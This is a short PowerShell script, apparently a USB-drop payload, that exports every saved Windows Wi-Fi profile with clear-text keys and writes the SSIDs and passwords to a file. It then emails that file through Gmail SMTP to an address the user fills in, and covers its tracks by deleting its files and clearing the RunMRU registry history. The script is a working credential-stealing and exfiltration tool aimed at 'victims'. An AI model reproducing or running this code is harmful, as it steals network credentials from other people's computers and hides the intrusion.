// --> Export all Windows Wifi profiles (SSID, password) in XML

netsh wlan export profile key=clear

// --> Extract all SSID and Password field to pass.txt

dir *.xml |% {
$xml=[xml] (get-content $_)
$a= "==================SpeedCuber======================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial

Out-File pass.txt -Append -InputObject $a

}

// --> Mail pass.txt

$SMTPServer = 'smtp.gmail.com'
  

  $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
   

  $SMTPInfo.EnableSsl = $true
  
 // --> Replace it with your Gmail username and password
 
  $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('speedcuber@gmail.com', 'lamepassword')
 
 
  $ReportEmail = New-Object System.Net.Mail.MailMessage
  
 
  $ReportEmail.From = 'speedcuber@gmail.com' // --> Replace it with your Gmail username 

 
  $ReportEmail.To.Add('speedcuber@gmail.com') // --> Replace it with your Gmail username 

 
  $ReportEmail.Subject = 'WIFI Pass Report of ' + $env:UserName
  
 
  $ReportEmail.Body = 'Attached is your victim WIFI Passwords'
 
 
  $ReportEmail.Attachments.Add('pass.txt')

 
  $SMTPInfo.Send($ReportEmail)

// --> Clearing your tracks
rm *.xml -Force
rm wifi.PS1 -Force 
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
exit


